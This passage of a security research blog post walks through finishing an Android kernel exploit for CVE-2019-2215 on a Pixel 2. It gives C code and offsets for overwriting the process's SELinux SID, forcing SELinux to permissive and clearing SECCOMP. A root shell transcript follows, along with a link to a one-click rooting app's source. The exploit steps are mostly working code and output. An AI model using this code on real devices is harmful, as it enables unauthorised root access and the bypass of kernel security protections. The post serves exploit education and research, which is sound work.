<p>It is now time to take out the strictest security policy: SELinux. Lower down in the <code>cred</code> struct of our process we see the <code>security</code> opaque type at offset 0x78:</p>

<div class="highlight"><pre><code class="language-c"><span class="p">...</span>
<span class="cp">#ifdef CONFIG_SECURITY</span>
	<span class="kt">void</span>		<span class="o">*</span><span class="n">security</span><span class="p">;</span>	<span class="cm">/* subjective LSM security */</span>
<span class="cp">#endif</span>
<span class="p">...</span></code></pre></div>

<p>This is pointer to a <code>struct task_security_struct</code> allocated by the <code>selinux_cred_alloc_blank</code> function in <a href="https://elixir.bootlin.com/linux/v4.4.196/source/security/selinux/hooks.c#L3550">security/selinux/hooks.c</a>.</p>

<p>The definition of this struct is as follows:</p>
<div class="highlight"><pre><code class="language-c"><span class="k">struct</span> <span class="nc">task_security_struct</span> <span class="p">{</span>
	<span class="n">u32</span> <span class="n">osid</span><span class="p">;</span>		<span class="cm">/* SID prior to last execve */</span>
	<span class="n">u32</span> <span class="n">sid</span><span class="p">;</span>		<span class="cm">/* current SID */</span>
	<span class="n">u32</span> <span class="n">exec_sid</span><span class="p">;</span>		<span class="cm">/* exec SID */</span>
	<span class="n">u32</span> <span class="n">create_sid</span><span class="p">;</span>		<span class="cm">/* fscreate SID */</span>
	<span class="n">u32</span> <span class="n">keycreate_sid</span><span class="p">;</span>	<span class="cm">/* keycreate SID */</span>
	<span class="n">u32</span> <span class="n">sockcreate_sid</span><span class="p">;</span>	<span class="cm">/* fscreate SID */</span>
<span class="p">};</span></code></pre></div>
<p>We are most interested in the <code>sid</code> field as this determines the active SELinux context of our process.
Lets set this to another higher privileged SID, such kernel (SID = 1) or init (SID = 7) (<a href="https://elixir.bootlin.com/linux/v4.4.196/source/security/selinux/include/initial_sid_to_string.h">initial SID list</a>)!</p>

<div class="highlight"><pre><code class="language-c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">current_cred_security</span> <span class="o">=</span> <span class="n">kernel_read_ulong</span><span class="p">(</span><span class="n">my_cred</span><span class="o">+</span><span class="mh">0x78</span><span class="p">);</span>

<span class="c1">// change SID to kernel</span>
<span class="n">kernel_write_uint</span><span class="p">(</span><span class="n">current_cred_security</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[+] SID -&gt; kernel (1)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span></code></pre></div>
<p>The exploit works up until we change our SID at which point our ADB connection hangs. Why does this hang? Well, just changing the SID of a process connected and communicating to others, isn’t guaranteed to work. It depends on the SELinux policy for the target SID. Did it actually change the SID?</p>

<div class="highlight"><pre><code>walleye:/ $ cat /proc/xxx/attr/current
u:r:kernel:s0
</code></pre></div>

<p>It did, but it looks like hoisting ourself directly from <code>shell</code> to <code>kernel</code> isn’t going to work. We need to take a different approach and disable SELinux outright. Disabling SELinux is a popular technique for Android kernel exploits and is achievable with a kernel R/W primitive. The only caveat is that need to know the offset from the kernel base of the <code>selinux_enforcing</code> symbol. If we happen to have a working kernel build tree in front of us, we can likely find this symbol using <code>pahole</code> as mentioned in the original PoC source. But what if we just have a kernel binary?</p>

<h4 id="recovering-selinux_enforcing">Recovering selinux_enforcing</h4>

<p>I will detail the steps taken to recover this symbol for the Pixel 2 kernel <code>4.4.177-g83bee1dc48e8</code>. Googling this string leads to a <a href="https://android.googlesource.com/device/google/wahoo-kernel/+/16747445501c5a2cc90c00121b2b9ed23fee302a">wahoo-kernel repo</a>. From here we can download the <a href="https://android.googlesource.com/device/google/wahoo-kernel/+/16747445501c5a2cc90c00121b2b9ed23fee302a/Image.lz4-dtb">Image.lz4-dtb</a> file, which happens to match the kernel I’m running.
Downloading this file, we have a compressed kernel image. Decompressing this gives us a vmlinux file:</p>

<div class="highlight"><pre><code>[grant ~/Downloads &gt;&gt; lz4 -d Image.lz4-dtb Image
Decompressed : 34 MB  Stream followed by undecodable data at position 14571037
Image.lz4-dtb        : decoded 36238336 bytes
[grant ~/Downloads &gt;&gt; strings Image | grep "Linux version "
Linux version 4.4.177-g83bee1dc48e8 (android-build@abfarm-us-west1-c-0087) (Android (5484270 based on r353983c) clang version 9.0.3 (https://android.googlesource.com/toolchain/clang 745b335211bb9eadfa6aa6301f84715cee4b37c5) (https://android.googlesource.com/toolchain/llvm 60cf23e54e46c807513f7a36d0a7b777920b5881) (based on LLVM 9.0.3svn)) #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019
</code></pre></div>

<p>Now we need to dig into this and recover the kallsyms table. There is an excellent tool that does all of the complicated steps for you: <a href="https://github.com/nforest/droidimg">https://github.com/nforest/droidimg</a>. Cloning and installing the dependencies of droidimg, we run it on our decompressed image:</p>

<div class="highlight"><pre><code>[grant ~/Downloads/droidimg &gt;&gt; ./vmlinux.py Image
Linux version 4.4.177-g83bee1dc48e8 (android-build@abfarm-us-west1-c-0087) (Android (5484270 based on r353983c) clang version 9.0.3 (https://android.googlesource.com/toolchain/clang 745b335211bb9eadfa6aa6301f84715cee4b37c5) (https://android.googlesource.com/toolchain/llvm 60cf23e54e46c807513f7a36d0a7b777920b5881) (based on LLVM 9.0.3svn)) #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019
[+]kallsyms_arch = arm64
[!]could be offset table...
[!]lookup_address_table error...
[!]get kallsyms error...
</code></pre></div>

<p>We get an error finding the kallsyms table. I suspect it has to do with KASLR given some notes in the README. I run a tool provided by droidimg to fixup the binary for further extraction:</p>

<div class="highlight"><pre><code>[grant ~/Downloads/droidimg &gt;&gt; gcc -o fix_kaslr_arm64 fix_kaslr_arm64.c
fix_kaslr_arm64.c:265:5: warning: always_inline function might not be inlinable [-Wattributes]
 int main(int argc, char **argv)

[grant ~/Downloads/droidimg &gt;&gt; ./fix_kaslr_arm64 Image Image_kaslr
Original kernel: image_dec, output file: image_dec_kaslr
kern_buf @ 0x7f4105ea2000, mmap_size = 36241408
rela_start = 0xffffff80098d66d0
p-&gt;info = 0x0
rela_end = 0xffffff800a0810d8
335004 entries processed
</code></pre></div>

<p>Finally we’re able to get the symbol table:</p>

<div class="highlight"><pre><code>[grant ~/Downloads/droidimg &gt;&gt; ./vmlinux.py Image_kaslr
Linux version 4.4.177-g83bee1dc48e8 ...
[+]kallsyms_arch = arm64
[+]numsyms: 131603
[+]kallsyms_address_table = 0x11acc00
[+]kallsyms_num = 131603 (131603)
[+]kallsyms_name_table = 0x12ade00
[+]kallsyms_type_table = 0x0
[+]kallsyms_marker_table = 0x1469900
[+]kallsyms_token_table = 0x146aa00
[+]kallsyms_token_index_table = 0x146ae00
[+]kallsyms_start_address = 0xffffff8008080000L
[+]found 9915 symbols in ksymtab
ffffff8008080000 t _head
ffffff8008080000 T _text
...
</code></pre></div>

<p>Scanning through the output symbols, no <code>selinux_enforcing</code> is found! Reading the source code of droidimg shows that it has a special mode that uses <a href="https://github.com/cea-sec/miasm">Miasm</a> to recover unexported symbols, namely <code>selinux_enforcing</code>. Re-running with Miasm support coughs up our symbol: <code>ffffff800a44e4a8 B selinux_enforcing</code>. Subtracting <code>ffffff8008080000 t _head</code> from this
gives us an offset of <code>0x23ce4a8</code>.</p>

<p>Finally, we are able to disable SELinux in our exploit:</p>

<div class="highlight"><pre><code class="language-c"><span class="cp">#define SYMBOL__selinux_enforcing 0x23ce4a8</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">enforcing</span> <span class="o">=</span> <span class="n">kernel_read_uint</span><span class="p">(</span><span class="n">kernel_base</span> <span class="o">+</span> <span class="n">SYMBOL__selinux_enforcing</span><span class="p">);</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"SELinux status = %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">enforcing</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="n">enforcing</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Setting SELinux to permissive</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">kernel_write_uint</span><span class="p">(</span><span class="n">kernel_base</span> <span class="o">+</span> <span class="n">SYMBOL__selinux_enforcing</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"SELinux is already in permissive mode</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>

<h3 id="disabling-seccomp">Disabling SECCOMP</h3>
<p>When running my initial exploits over ADB, I wasn’t affected by any SECCOMP policies. When I bundled the exploit into an application, commands that worked before stopped doing so. For example, the mount command I was using to create a tmpfs for Magisk on <code>/sbin</code> was no longer mounting.
SECCOMP was doing its job and limited the application and its children from being able to access any old syscall.</p>

<p>Like our task’s DAC, CAP, and MAC state, SECCOMP also lives in our <code>task_struct</code> as the <code>seccomp</code> inline struct:</p>

<div class="highlight"><pre><code class="language-c"><span class="k">struct</span> <span class="nc">seccomp</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">mode</span><span class="p">;</span>
	<span class="k">struct</span> <span class="nc">seccomp_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>
<span class="p">};</span></code></pre></div>

<p>The <code>mode</code> can be either 0 (disabled), <code>SECCOMP_MODE_STRICT</code>, or <code>SECCOMP_MODE_FILTER</code>.
SECCOMP is usually used in filter mode, where an eBPF program is created to be executed on each syscall, returning ALLOW or DENY, similar to firewall rules. This filter is pointed to by the <code>filter</code> parameter.
To disable SECCOMP seems as simple as changing the <code>mode</code> to 0, but this just leads to a kernel crash. But why?
Well, when SECCOMP is enabled, it also sets the <code>TIF_SECCOMP</code> flag in the <code>task_struct-&gt;thread_info.flags</code> struct, which
is used by the initial syscall entry handlers to determine if any filtering needs to take place. Reseting the mode
BEFORE reseting this flag leads to a kernel <code>BUG()</code> statement being called from the <code>__secure_computing</code> function. To disable SECCOMP outright, this flag is cleared. To prevent SECCOMP from being copied to child processes on <code>fork()</code> the mode then needs to be cleared (the filter too).</p>

<div class="highlight"><pre><code class="language-c"><span class="cp">#define OFFSET__task_struct__thread_info__flags 0 </span><span class="c1">// if CONFIG_THREAD_INFO_IN_TASK is defined</span>

<span class="c1">// Grant: SECCOMP isn't enabled when running the poc from ADB, only from app contexts</span>
<span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_GET_SECCOMP</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Disabling SECCOMP</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="c1">// clear the TIF_SECCOMP flag and everything else :P (feel free to modify this to just clear the single flag)</span>
  <span class="c1">// arch/arm64/include/asm/thread_info.h:#define TIF_SECCOMP 11</span>
  <span class="n">kernel_write_ulong</span><span class="p">(</span><span class="n">current_ptr</span> <span class="o">+</span> <span class="n">OFFSET__task_struct__thread_info__flags</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">kernel_write_ulong</span><span class="p">(</span><span class="n">current_ptr</span> <span class="o">+</span> <span class="n">OFFSET__task_struct__cred</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">kernel_write_ulong</span><span class="p">(</span><span class="n">current_ptr</span> <span class="o">+</span> <span class="n">OFFSET__task_struct__cred</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// this offset was eyeballed</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_GET_SECCOMP</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to disable SECCOMP!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"SECCOMP disabled!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"SECCOMP is already disabled!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>

<p>Finally, with SECCOMP disabled, we have achieved a full root shell:</p>
<div class="highlight"><pre><code>walleye:/ $ /data/local/tmp/poc
usage: /data/local/tmp/poc [shell|shell_exec]
/data/local/tmp/poc shell - spawns an interactive shell
/data/local/tmp/poc shell_exec "command" - runs the provided command in an escalated shell
1|walleye:/ $ /data/local/tmp/poc shell
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
CHILD: Finished write to FIFO.
writev() returns 0x2000
PARENT: Finished calling READV
current_ptr == 0xffffffeaa7e86580
CHILD: Doing EPOLL_CTL_DEL.
CHILD: Finished EPOLL_CTL_DEL.
recvmsg() returns 49, expected 49
should have stable kernel R/W now :)
current-&gt;mm == 0xffffffeab3991040
current-&gt;mm-&gt;user_ns == 0xffffff98848af2c8
kernel base is 0xffffff9882880000
current-&gt;cred == 0xffffffeaa0223540
Starting as uid 2000
Escalating...
UIDs changed to root!
Capabilities set to ALL
SELinux status = 1
Setting SELinux to permissive
Re-joining the init mount namespace...
Re-joining the init net namespace...
SECCOMP disabled!
Spawning shell!
:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
:/ # getenforce
Permissive
</code></pre></div>

<p>If this kind of exploitation excites you and you want to learn more or practice, there are some very good Linux kernel exploitation CTF problems that I’d recommend you try: <a href="https://github.com/mncoppola/Brad-Oberberg">Brad Oderberg</a>, <a href="https://github.com/mncoppola/suckerusu">suckerusu</a>, <a href="https://github.com/mncoppola/StringIPC">StringIPC</a>, and <a href="http://pwnable.kr/">pwnable.kr (Rootkiss/syscall)</a> (plus many more I’m leaving out). Andrey K. has an index of Linux kernel exploitation techniques and talks <a href="https://github.com/xairy/linux-kernel-exploitation">that you should also check out</a>.</p>

<h2 id="qu1ckr00t">Qu1ckR00t</h2>

<p>Once I had a reliable working exploit that I could use over ADB, I decided it would be neat to see the exploit working from an application context. I created Qu1ckR00t (the name is satire) as a one-click rooting application that also YOLO-installs™ Magisk.</p>

<p><strong>Qu1ckR00t is a PROOF OF CONCEPT. It should NOT be used on your personal device with valuable userdata. It has only been tested on a Pixel 2. Running it on any other device / kernel will likely lead to a crash or even data loss. DO NOT install extra Magisk environment files or upgrade Magisk if prompted as this will patch boot, breaking DM-Verity on next boot likely leading to data-loss when you need to reflash.</strong></p>

<p>The bottom line is that Magisk was NEVER meant to be installed this way and you will really break things without further patches to Magisk itself.
That being said, I did all my development on my personal device, but I am a so called “professional”.</p>

<p>There is nothing novel about Qu1ckR00t, but it is cool to get a little taste of a typical iOS jailbreaking flow on Android.
Maybe in the future if OEMs like Samsung completely remove OEM Unlock, this kind of rooting method will return to popularity.</p>

<p>Without further ado – <strong>Qu1ckr00t source code: <a href="https://github.com/grant-h/qu1ckr00t">https://github.com/grant-h/qu1ckr00t</a></strong></p>

<div class="twitter-tweet twitter-tweet-rendered" style="display: flex; max-width: 550px; width: 100%; margin-top: 10px; margin-bottom: 10px;"><iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="" style="position: static; visibility: visible; width: 550px; height: 766px; display: block; flex-grow: 1;" title="Twitter Tweet" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/Tweet.html" data-tweet-id="1182045384505466885"></iframe></div>
<script async="" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/widgets.js.下載" charset="utf-8"></script>


  </article>

</div>
<div id="disqus_thread"></div>

<script type="text/x-mathjax-config;executed=true">
  MathJax.Hub.Config({
    extensions: ["tex2jax.js"],
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
      processEscapes: true
    },
    CommonHTML: { scale: 95, linebreaks: { automatic: true } }
  });
</script>
<script type="text/javascript" defer="" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/MathJax.js.下載"></script>

<script src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/disqusloader.js.下載" defer=""></script>
<script>
addEventListener("load", function(){
disqusLoader( '#disqus_thread',
{
        scriptUrl: 'https://granthernandez.disqus.com/embed.js',
        laziness: 1,
        disqusConfig: function()
        {
            this.page.url = "https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/";
            this.page.title = "Tailoring CVE-2019-2215 to Achieve Root";
            this.page.identifier = "tailoring-cve-2019-2215-to-achieve-root";
        }
});
});
</script>


      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <div class="text-center">

        <ul class="spec-media-list">
          <li>
            <a href="https://twitter.com/digital_cold">
            <i title="Twitter (@digital_cold)" class="spec-icon fa fa-twitter"></i>
            </a>
          </li>
          <li>
            <a href="https://github.com/grant-h">
            <i title="GitHub (@grant-h)" class="spec-icon fa fa-github"></i>
            </a>
          </li>
          <li>
            <a href="https://scholar.google.com/citations?user=buA268oAAAAJ&amp;hl=en">
            <i title="Google Scholar" class="spec-icon fa fa-graduation-cap"></i>
            </a>
          </li>
          <li>
            <a href="https://www.linkedin.com/in/grant-hernandez">
            <i title="LinkedIn" class="spec-icon fa fa-linkedin-square"></i>
            </a>
          </li>
          <li>
            <a href="mailto:grant.h.hernandez+website@gmail.com?subject=Hey%20There">
            <i title="Email" class="spec-icon fa fa-envelope"></i>
            </a>
          </li>
        </ul>
        <p onclick="javascript:do_it();" class="copyright">© 2013 — 2021</p>
      </div>
    </div>

</footer>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  /* Skip recording GA events to our account if in development.*/
  if (document.location.hostname != 'localhost') {
    ga('create', 'UA-75276282-1', 'auto');
  }
  ga('send', 'pageview');
</script>
<script src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/fun.js.下載" type="text/javascript"></script>


  


<iframe scrolling="no" frameborder="0" allowtransparency="true" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/widget_iframe.a53eecb4584348a2ad32ec2ae21f6eae.html" title="Twitter settings iframe" style="display: none;"></iframe><div>
    <link rel="stylesheet" href="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/font-awesome.min.css">
  </div><iframe id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" title="Twitter analytics iframe" src="./2019 - Tailoring CVE-2019-2215 to Achieve Root_files/saved_resource.html"></iframe></body></html>